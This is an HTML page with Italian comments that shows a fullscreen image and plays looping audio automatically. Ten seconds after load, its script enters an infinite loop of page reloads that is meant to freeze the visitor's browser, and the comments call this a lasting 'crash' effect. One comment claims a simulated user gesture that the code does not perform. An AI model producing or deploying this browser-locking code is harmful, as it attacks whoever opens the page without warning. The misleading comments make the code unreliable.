<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<title>Fullscreen Image + Audio Immediate</title>
<style>
  html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: black;
  }
  img {
    width: 100vw;
    height: 100vh;
    object-fit: cover;
    display: block;
  }
</style>
</head>
<body>

<img src="https://i.pinimg.com/474x/0c/93/2a/0c932a465c54f040f68864704e03f022.jpg" alt="fullscreen">

<script>
  // crea dinamicamente l'audio direttamente nel page context
  const audio = document.createElement("audio");
  audio.src = "konkonse.mp3";  // assicurati che il file sia nella stessa cartella
  audio.loop = true;
  audio.autoplay = true;
  audio.muted = false;

  // append alla pagina
  document.body.appendChild(audio);

  // play forzato subito (alcuni browser lo richiedono così)
  const playAudio = () => {
    audio.play().catch(err => {
      console.log("Tentativo di autoplay fallito, forzando user gesture simulata");
    });
  };

  // esegue subito appena carica
  window.addEventListener("load", playAudio);

  // Loop infinito di reload dopo 10 secondi
  setTimeout(() => {
    while(1) {
      location.reload(1);
    }
  }, 10000);

  // mantiene effetto “crash” anche al reload
  onbeforeunload = function () {
    localStorage.x = 1;
  };
</script>

</body>
</html>
